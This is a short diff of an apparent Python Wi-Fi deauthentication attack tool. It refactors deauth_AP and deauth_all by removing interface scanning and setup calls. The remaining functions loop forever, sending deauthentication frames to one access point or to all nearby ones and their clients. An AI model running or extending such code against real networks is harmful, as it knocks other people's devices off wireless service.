@@ -20,22 +20,14 @@ def send_client_deauth(AP):
 
 
 def deauth_AP(BSSID):
-	interfaces = get_interfaces()
-	iface = interfaces[0]  # we will use just one interface for now.
-	iwlist_scan(iface)
 	AP = network.get_AP(BSSID)
 	set_channel(AP)
-	prepare_attack()
 	while 1:
 		send_AP_deauth(AP)
 		send_client_deauth(AP)
 
 
 def deauth_all(skip):
-	interfaces = get_interfaces()
-	iface = interfaces[0]  # we will use just one interface for now.
-	iwlist_scan(iface)
-	prepare_attack()
 	while 1:
 		for AP in network.APs:
 			if AP.BSSID in skip:
